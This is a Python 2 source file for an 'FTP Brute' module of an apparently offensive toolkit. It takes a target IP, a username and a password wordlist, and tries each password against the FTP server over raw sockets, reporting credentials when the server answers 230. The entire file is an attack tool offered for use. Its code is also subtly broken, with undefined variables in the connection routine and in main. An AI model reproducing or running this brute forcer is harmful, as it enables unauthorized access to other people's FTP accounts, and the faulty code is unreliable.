"""
ftp_brute.py - ftp brute forcer

Author: Levi Nachamni (levi0x0)
Date: 21/05/2014
Version: 0.1
License: GPL 3

Description:
	This is a Simple Module for FTP Brute force that works Any FTP Server 

"""

"""
FIXME: Need to add threads
"""
MODULE_NAME = "FTP Brute"
MODULE_AUTHOR = "Levi Nachamni (levi0x0)"
MODULE_LICENSE = "GPL 3"
MODULE_VERSION = "0.4"
MODULE_DESC = "This is a Simple Module for FTP Brute force that works Any FTP Server "

from socket import *
import sys
import threading
import Queue
from api.std import *

#unix
os_slash = "/"

class test_ftp(threading.Thread):

		def __init__(self,target,user,passwords,):
			self.target = target #ftp server
			self.user = user #username
			self.passwords = passwords #wordlist
			self.port = 21 #port 21 default FTP PORT
			threading.Thread.__init__(self)


		def run(self):
			self.s = socket(AF_INET,SOCK_STREAM) #OPEN SOCKET TCP/IPV4

			self.test = self.s.connect_ex((self.target, self.port)) #connect 

			if self.test == 0:
				pass
			else:
				print "[-] PORT 21 close or server DOWN!"
				sys.exit()
			self.data = self.s.recv(1024)
			
			self.s.send('USER '+ self.user +'\r\n') #send user
			self.data = self.s.recv(1024) #recv data
			self.s.send('PASS ' + passw + '\r\n') #send password
			self.data = self.s.recv(3)
			self.s.close()
			return self.data



def main():
	try:		
		target = raw_input("* Target IP:")
		user = raw_input("* User:")
		pasw = "%s/api/txt%spassword.lst" % (home, os_slash)
		passwords = raw_input("Password list (Default):") or pasw
		passwords= open(passwords, "r").readlines()
		verbose = True
	
		print "[*]FTP brute force Good luck...."
		for passw in passwords:
			passw = passw.replace("\n", "")
			thread = test_ftp(target,user,passw,)
			a = thread.run()
			if a == '230':
				print "\nLogin Found!"
				print "USER:%s" % user
				print "PASS:%s" % passw
				print "sb0x project (c) 2013\n"
			elif verbose:
				print "[-]USER:%s PASS:%s" % (user,passw)
				pass
			else:
				pass

	except IOError:
		error("\n[-]No such file or directory: %s" % (passwords))
	except Exception as e:
		error(e.message)
